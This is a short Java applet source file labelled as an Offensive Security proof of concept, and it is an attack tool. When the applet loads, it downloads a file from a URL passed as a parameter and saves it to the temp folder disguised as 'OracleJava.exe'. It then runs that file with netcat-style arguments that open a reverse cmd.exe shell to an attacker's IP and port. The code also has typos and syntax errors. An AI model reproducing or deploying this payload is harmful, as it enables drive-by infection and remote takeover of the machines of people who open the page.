//Credit to Offensive Security for this POC

import java.applet.*;
import java.awt.*
import java.io.*;
import java.net.URL.*;
import java.util.*;

public class JavaAppletATK extends Applet { 


	private Object initialized = null;
	public Object isInitialized()
	{
		return initialized;
	}
	public void init() {
	 Process f;
	try {	
	String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
	String expath = tmpdir + "OracleJava.exe";
	String download = "";
	download = getPatameter("1");
	if (download.length() > 0) {
		//URL parameter
		URL url = new URL(download);
		//Get an input stream for reading
		InputStream in = url.openStream();
		//Create a buffered input stream for efficency
		BufferedInputStream bufIn = new BufferedInputStream(in);
		File outputFile = new File(expath);
		OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
		byte[] buffer = new byte[2048];
		for (;;) {
			int nBytes = bufIn.read(buffer);
			if (nBytes <= 0) break;
				out.write(buffer, 0, nBytes);
			}
			out.flush();
			out.close();
			in.close();
			f = Runtime.getRuntime().exec("cmd.exe /c " + expath + "<IP_ADDRESS> <PORT> -e cmd.exe");
		}
	} catch(IOException e) {
		e.printStackTrace();
	}
	//ended here and commented out below for bypass
	catch (Exception exception)
	{
		exception.printStackTrace();
	}
}
}
